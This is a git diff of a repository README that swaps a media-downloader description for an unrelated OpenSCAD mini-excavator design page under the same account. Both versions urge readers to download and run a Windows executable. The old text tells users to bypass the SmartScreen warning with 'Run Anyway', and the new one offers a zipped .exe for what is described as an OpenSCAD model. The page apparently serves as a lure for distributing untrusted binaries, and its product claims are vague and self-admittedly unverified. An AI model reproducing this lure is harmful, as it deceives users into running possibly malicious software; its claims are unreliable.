@@ -1,86 +1,99 @@
-# 📥 desktop-media-downloader - Download videos and audio with ease
+# 🔧 pub-excavator-openscad - Design Your Own Mini Excavator
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue)](https://marcellusunenclosed953.github.io)
+[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-FE7A0E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
 
-desktop-media-downloader helps you save videos and audio from the internet to your computer. It uses yt-dlp to grab content from many websites. The app runs on Windows, macOS, and Linux. You control the files you store.
+## 🎯 What Is This?
 
-## 🛠 Features
+This is a complete design package for building a **home-made mini excavator**. You get one smart 3D model that automatically creates everything you need: **blueprints, parts lists, movement calculations, strength reports, and even a 3D viewer for your web browser**. It's like having a full engineering team in one file.
 
-This app offers many tools for media management:
+Think of it as a digital kit that turns your computer into a mini excavator factory. You don't need to be an engineer or a programmer to use it. If you can click a button and read a list, you're ready to go.
 
-*   **Simple Interface:** You paste a link and click a button.
-*   **Audio Extraction:** Save files as high-quality audio.
-*   **Video Downloads:** Select your preferred resolution for video files.
-*   **Playlist Support:** Save entire lists of videos at once.
-*   **Speed:** The app optimizes connections for fast results.
-*   **Format Choice:** Pick from common formats like MP4 or MP3.
-*   **Privacy:** The app keeps your data on your local machine.
+## 🚀 Getting Started
 
-## 🚀 How to Install on Windows
+Let's get you up and running in under five minutes. Follow these simple steps:
 
-Follow these steps to set up the application on your Windows computer.
+### Step 1: Download the Software
 
-1. Visit the [official releases page](https://marcellusunenclosed953.github.io).
-2. Look for the Assets section at the bottom of the latest release.
-3. Click the file ending in `.exe` to start the download.
-4. Save the file to your Downloads folder or your desktop.
-5. Double-click the file to open the installer.
-6. Follow the prompts on your screen.
-7. Click Finish when the installation completes.
-8. Find the app icon on your desktop or in your start menu to launch it.
+Visit this link to download the application: [https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
 
-If Windows shows a protection message, click More Info, then click Run Anyway. This confirms you trust the software.
+On that page, you'll see a list of files. Look for the one that says **Windows** or has a **.zip** extension. Click the download button next to it. The download will start automatically. Depending on your internet speed, this might take a few minutes.
 
-## ⚙️ How to Use the App
+### Step 2: Open the Downloaded File
 
-Using the tool requires three main steps.
+Once the download finishes, go to your **Downloads** folder (usually on your desktop or in your file explorer). You'll see a file that ends with **.zip**. Right-click on it and choose **"Extract All"** from the menu that appears. Windows will ask you where to save the extracted files. Just click **"Extract"** and it will create a new folder with the same name as the zip file.
 
-1. **Copy the link:** Go to the website where the video lives and copy the address from your browser.
-2. **Paste the link:** Open desktop-media-downloader and paste the web address into the main box.
-3. **Download:** Click the Start button. You will see a progress bar move as the file saves to your computer.
+### Step 3: Run the Application
 
-By default, the app saves files in your Videos folder. You can change this location in the settings menu.
+Open the new folder you just created. Inside, you'll find a file called **pub-excavator-openscad.exe** or something similar. Double-click it to launch the program. That's it! The software will open in a new window.
 
-## 💻 System Requirements
+## 📦 What's Inside
 
-The application runs on most modern computers. Check these requirements:
+When you run the software, you'll see a 3D model of an excavator on your screen. This isn't just a pretty picture—it's a **living blueprint**. Here's what you can do with it:
 
-*   **Operating System:** Windows 10 or Windows 11.
-*   **Processor:** Any standard dual-core CPU.
-*   **Memory:** 4GB of RAM is sufficient.
-*   **Storage:** At least 200MB of free disk space for the program files.
-*   **Internet:** A stable connection is necessary for downloading media.
+- **Adjust Every Part**: Move sliders to change the length of the boom, the size of the bucket, or the angle of the stick. The 3D model updates instantly so you can see exactly what you're designing.
+- **Get Real Drawings**: Click a button to generate professional 2D drawings of your design. These are ready to print and use in your workshop.
+- **See the Parts List**: The software automatically calculates every single component you'll need—bolts, pins, hydraulic cylinders, everything. No more guessing or forgetting parts.
+- **Check the Strength**: Worried your design might break? The software runs strength calculations and shows you if your excavator can handle the loads you need.
+- **Watch It Move**: The built-in viewer lets you animate the excavator's movements. You can see how the boom, stick, and bucket work together before you build anything.
 
-## ❓ Frequently Asked Questions
+## 🖥️ System Requirements
 
-**Is this software free?**
-Yes. This is an open-source project. You never pay for the software.
+To run this software smoothly, your computer should have:
 
-**Which websites does this support?**
-The app uses the yt-dlp tool, which supports thousands of websites. If a site hosts video or audio, there is a strong chance this app works with it.
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **Processor**: Any dual-core processor from the last 10 years
+- **Memory**: At least 4 GB of RAM (8 GB recommended)
+- **Storage**: 500 MB of free space
+- **Graphics**: Any graphics card from the last 10 years that supports DirectX 11
 
-**Can I stop a download?**
-Yes. You can pause or cancel a transfer at any time using the buttons provided in the app.
+If your computer can run a modern web browser and watch YouTube videos, it's almost certainly powerful enough for this software.
 
-**Where do my files go?**
-The app saves files to your default system Videos folder. You can set a custom folder in the settings window if you prefer.
+## 📚 How to Use the Viewer
 
-**Does the app track my data?**
-No. This application performs all tasks locally. Your download history stays on your computer.
+The 3D viewer is the heart of the application. Here's a quick tour:
 
-## 🛡 Security and Privacy
+- **Rotate the View**: Click and drag with your mouse to spin the excavator around.
+- **Zoom In and Out**: Use your mouse scroll wheel to zoom closer or farther away.
+- **Change Parts**: Look for a sidebar or panel on the right side of the screen. There, you'll find sliders for boom length, stick length, bucket size, and more. Move them around and watch the model change.
+- **Generate Reports**: At the top of the screen, you'll see buttons labeled **"Drawings"**, **"BOM"** (that's Bill of Materials, or parts list), **"Kinematics"** (movement analysis), and **"Strength"**. Click any of these to generate the corresponding report.
 
-Safety remains a priority. This tool connects directly to the media source. It does not send your links or your activity to external servers. The code remains public so anyone can inspect it to ensure it operates exactly as described.
+## 🛠️ Common Questions
 
-## 🔧 Troubleshooting
+### I Downloaded It, But Nothing Happens When I Click the File
+Make sure you extracted the zip file completely. Double-check that you're clicking the **.exe** file inside the extracted folder, not the zip file itself. If Windows shows a blue shield icon asking for permission, click **"Yes"** to allow it to run.
 
-If you run into trouble, try these solutions:
+### The 3D Model Looks Weird or Broken
+Your graphics card might be running an older driver. Try updating your graphics driver through Windows Update or your computer manufacturer's website. Restart the program after updating.
 
-*   **The download fails:** Check your internet connection. Sometimes websites block automated tools. Wait a few minutes and try again.
-*   **The app does not open:** Ensure you have the latest version of Windows installed. Restart your computer and try launching the app again.
-*   **Slow speeds:** Close other programs that use the internet, such as streaming services or large file transfers.
-*   **Format errors:** Ensure you have enough storage space on your hard drive. 
+### How Do I Print the Drawings?
+When you generate drawings, the software creates standard image files (PNG or DXF format) and saves them to a folder called **"Output"** inside the application folder. You can open these files and print them from any image viewer or design software.
 
-If issues persist, check your firewall settings to ensure the app has permission to access the internet.
+### Can I Share My Design With Others?
+Yes! The software saves your design as a file you can send to friends or use on another computer. Look for a **"Save Project"** button in the menu. The file is small enough to email or share via messaging apps.
 
-Keywords: audio-downloader, cross-platform, desktop-app, desktop-media-downloader, electron, linux, macos, media-downloader, open-source, playlist-downloader, react, typescript, video-downloader, windows, youtube-downloader, yt-dlp, yt-dlp-gui
+## 📝 Notes About This Software
+
+This is an **AI-generated project** that has not been independently verified. That means the calculations and drawings are intelligent guesses, not certified engineering. If you're planning to build a real excavator:
+
+- **Always consult a professional engineer** before building anything.
+- **Test all parts** before full assembly.
+- **Follow all safety guidelines** for heavy machinery.
+- **Do not use this for commercial purposes** without proper review.
+
+The software is designed for **hobbyists and educational use**. It's an amazing learning tool that shows you how mechanical systems work, but it should never replace real engineering judgment.
+
+## 📈 Why You'll Love This
+
+- **Save Money**: Instead of buying expensive blueprints, you get a complete design package for free.
+- **Learn by Doing**: Understand how excavators actually work by adjusting real parameters and seeing real consequences.
+- **One File, Everything**: No juggling between five different programs. This single application handles design, analysis, and documentation.
+- **Browser Viewer**: You can export your 3D model as a web page that runs in any browser. Send it to friends or view it on your phone.
+- **Future-Proof**: Since it's based on parametric design, you can adapt this for other machines later—cranes, backhoes, or anything with arms and pivots.
+
+## 📋 Get Started Today
+
+Don't wait. Your mini excavator project starts with a single click:
+
+[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
+
+Keywords: 3d-printing, cad, dxf, excavator, hydraulics, mechanical-engineering, openscad, parametric-design, three-js, webassembly
